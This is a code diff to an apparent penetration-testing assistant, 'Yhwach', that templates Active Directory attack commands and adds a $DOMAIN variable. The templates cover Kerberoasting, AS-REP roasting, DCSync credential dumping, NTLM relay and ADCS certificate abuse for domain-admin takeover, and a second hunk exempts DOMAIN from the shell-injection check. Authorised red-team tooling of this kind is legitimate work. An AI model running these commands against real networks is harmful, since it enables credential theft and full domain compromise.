@@ -3,7 +3,8 @@
 Each action id (referenced by playbook rules) maps to one or more command
 templates. Templates use string.Template `$VARS` (not str.format) so JSON
 payload braces don't need escaping. Context vars: $IP $PORT $SCHEME $URL
-$ENDPOINT $MODEL, plus $OSAI for the operator's OSAI script dir.
+$ENDPOINT $MODEL $DOMAIN (the engagement's AD domain, when known), plus $OSAI
+for the operator's OSAI script dir.
 
 Execution policy — Yhwach proposes, the operator executes:
   * read_only + self-contained -> Yhwach may run it (`yhwach run --go`)
@@ -235,15 +236,15 @@ ACTION_REGISTRY: dict[str, Action] = {
         ["nxc ldap $IP -u '' -p '' --users --groups"], outputs="raw",
         note="Anonymous LDAP dump — users/groups feed AS-REP roast + spraying."),
     "kerbrute_userenum": _a("kerbrute_userenum",
-        ["kerbrute userenum -d <DOMAIN> --dc $IP <userlist>"],
+        ["kerbrute userenum -d $DOMAIN --dc $IP <userlist>"],
         runnable=False, outputs="raw",
         note="Validate a username list against the DC (no creds). Needs a wordlist."),
     "asreproast_users": _a("asreproast_users",
-        ["impacket-GetNPUsers <DOMAIN>/ -dc-ip $IP -usersfile <userlist> -no-pass -format hashcat"],
+        ["impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -usersfile <userlist> -no-pass -format hashcat"],
         risk="propose", runnable=False, outputs="raw",
         note="AS-REP roast — no creds needed; crack $krb5asrep$ (hashcat -m 18200)."),
     "kerberoast_getuserspns": _a("kerberoast_getuserspns",
-        ["impacket-GetUserSPNs -request -dc-ip $IP <DOMAIN>/<USER>:<PASS>"],
+        ["impacket-GetUserSPNs -request -dc-ip $IP $DOMAIN/<USER>:<PASS>"],
         risk="propose", runnable=False, outputs="raw",
         note="Kerberoast — needs valid domain creds; crack $krb5tgs$ (hashcat -m 13100)."),
     "ntlmrelay_setup": _a("ntlmrelay_setup",
@@ -251,7 +252,7 @@ ACTION_REGISTRY: dict[str, Action] = {
         risk="propose", runnable=False, outputs="raw",
         note="Relay to SMB-signing-off hosts; pair with a coercion (PetitPotam/printerbug)."),
     "dcsync_secretsdump": _a("dcsync_secretsdump",
-        ["impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@$IP"],
+        ["impacket-secretsdump -just-dc $DOMAIN/<USER>:<PASS>@$IP"],
         risk="propose", runnable=False, outputs="raw",
         note="DCSync the DC (principal has replication rights); dumps NTDS hashes -> DA."),
     "unconstrained_delegation_capture": _a("unconstrained_delegation_capture",
@@ -261,9 +262,9 @@ ACTION_REGISTRY: dict[str, Action] = {
         risk="propose", runnable=False, outputs="raw",
         note="Unconstrained delegation: coerce the DC, capture its TGT, then DCSync."),
     "certipy_request": _a("certipy_request",
-        ["certipy find -vulnerable -json -u <USER>@<DOMAIN> -p <PASS> -dc-ip $IP -o certipy",
-         "certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip $IP -ca <CA> "
-         "-template <TEMPLATE> -upn administrator@<DOMAIN>",
+        ["certipy find -vulnerable -json -u <USER>@$DOMAIN -p <PASS> -dc-ip $IP -o certipy",
+         "certipy req -u <USER>@$DOMAIN -p <PASS> -dc-ip $IP -ca <CA> "
+         "-template <TEMPLATE> -upn administrator@$DOMAIN",
          "certipy auth -pfx administrator.pfx -dc-ip $IP  # -> NT hash / TGT"],
         risk="propose", runnable=False, outputs="raw",
         note="ADCS abuse (certipy): request a cert as a privileged UPN, then auth -> DA."),
@@ -764,6 +765,7 @@ def context_from_surface(ip: str, port: int, meta: dict[str, Any] | None) -> dic
         "URL": f"{scheme}://{ip}:{port}",
         "ENDPOINT": endpoint,
         "MODEL": str(model),
+        "DOMAIN": "<DOMAIN>",  # overridden with the engagement's AD domain when known
         "OSAI": "$OSAI",  # left for the operator's env; safe_substitute keeps it
     }
 
@@ -791,7 +793,9 @@ def _tainted_context_values(context: dict[str, str]) -> dict[str, str]:
     never auto-run into a shell here (render-only actions carry it)."""
     bad = {}
     for k, v in context.items():
-        if k == "OSAI":
+        # OSAI (env dir) and DOMAIN (engagement config / a "<DOMAIN>" placeholder)
+        # are operator-sourced, never target-controlled — skip the injection check.
+        if k in ("OSAI", "DOMAIN"):
             continue
         if any(c in _SHELL_META for c in str(v)):
             bad[k] = v
